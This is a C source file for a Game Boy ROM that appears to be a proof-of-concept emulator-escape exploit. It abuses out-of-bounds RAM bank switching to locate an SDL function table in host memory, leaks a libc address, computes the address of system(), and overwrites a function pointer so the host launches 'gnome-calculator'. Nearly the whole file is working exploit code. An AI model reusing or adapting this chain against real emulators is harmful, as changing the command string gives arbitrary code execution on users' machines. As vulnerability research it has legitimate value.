#include <gb/gb.h>
#include <stdio.h>
#include <string.h>

#define EXTERNAL_MEM_ADDR (char *)0xa000

void print_ptr(unsigned char *ptr)
{
    unsigned char buf[20] = "0x";
    unsigned char c;

    for (int i = 7, n = 2; i >= 0; i--, n += 2) {
        c = ptr[i] & 0xf;
        buf[n + 1] = c > 9 ? (c - 10 + 'A') : c + '0';
        c = (ptr[i] >> 4) & 0xf;
        buf[n] = c > 9 ? (c - 10 + 'A') : c + '0';
    }

    buf[18] = '\n';
    buf[19] = '\0';
    printf(buf);
}

unsigned char *add(unsigned char *ptr1, unsigned char *ptr2) {
  unsigned carry = 0;

  for (unsigned i = 0; i < 8; ++i) {
    if ((ptr1[i] + ptr2[i] + carry) & 0x100) {
      ptr1[i] += ptr2[i] + carry;
      carry = 1;
    } else {
      ptr1[i] += ptr2[i] + carry;
      carry = 0;
    }
  }

  return ptr1;
}

unsigned char *sub(unsigned char *ptr1, unsigned char *ptr2) {
  unsigned borrow = 0;

  for (unsigned i = 0; i < 8; ++i) {
    if (borrow) {
      if (ptr1[i])
        borrow = 0;

      ptr1[i] -= 1;
    }
    if (ptr1[i] < ptr2[i]) {
      borrow = 1;
      ptr1[i] = ptr1[i] + 0x100 - ptr2[i];
    } else {
      ptr1[i] -= ptr2[i];
    }
  }

  return ptr1;
}

/* trigger gb_memory_change_ram_bank() */
void switch_bank(unsigned bank) {
  unsigned char *p = (unsigned char *)0x4000;

  *p = bank;
}

void main() {
  switch_bank(4);

  unsigned char *ptr = EXTERNAL_MEM_ADDR;
  unsigned char *libc_base, *system;
  unsigned char libc_leak[8] = {0};
  unsigned table_offset = 0;
  unsigned i;

  /* exploit `call qword ptr [rax+0x1d0]`, with rdi == rax */
  /* controlled memory which rax pointed to (SDL function table) */

  /* search for function table */
  /* offsets:
   * 0x6f0
   * 0x8d0
   * 0x8f0
   * 0x900
   * 0x920
   */
  for (i = 0; i < 0x2000 - 0x28; i += 8) {
    if (ptr[i]      == 0xf0 && ((ptr[i+0x1]  & 0xf) == 0x6) &&
        ptr[i+0x8]  == 0xd0 && ((ptr[i+0x9]  & 0xf) == 0x8) &&
        ptr[i+0x10] == 0xf0 && ((ptr[i+0x11] & 0xf) == 0x8) &&
        ptr[i+0x18] == 0x00 && ((ptr[i+0x19] & 0xf) == 0x9) &&
        ptr[i+0x20] == 0x20 && ((ptr[i+0x21] & 0xf) == 0x9)) {
      puts("found function table:");
      for (unsigned j = i; j < i + 0x28; j += 8) {
        print_ptr(&ptr[j]);
      }
      table_offset = i;
      break;
    }
  }

  /* leak libc address from function table */
  for (i = 0; i < 8; ++i) {
    libc_leak[i] = ptr[table_offset + i];
  }

  /* libc base offset: -0x2ca6f0 */
  unsigned char offset[] = { 0xf0, 0xa6, 0x2c, 0, 0, 0, 0, 0 };
  libc_base = sub(libc_leak, offset);

  puts("leaked base:");
  print_ptr(libc_base);

  /* system offset: 0x55410 */
  unsigned char system_off[] = { 0x10, 0x54, 0x5, 0, 0, 0, 0, 0 };
  system = add(libc_base, system_off);

  puts("system:");
  print_ptr(system);

  /* set argument */
  unsigned rdi_offset = table_offset - 0x1d0;
  strcpy(ptr + rdi_offset, "gnome-calculator");

  /* set function */
  for (i = 0; i < 8; ++i) {
    ptr[table_offset + i] = system[i];
  }

  /* trigger flush back to OOB */
  switch_bank(0);

  /* wait for ignite */
  while (1);
}
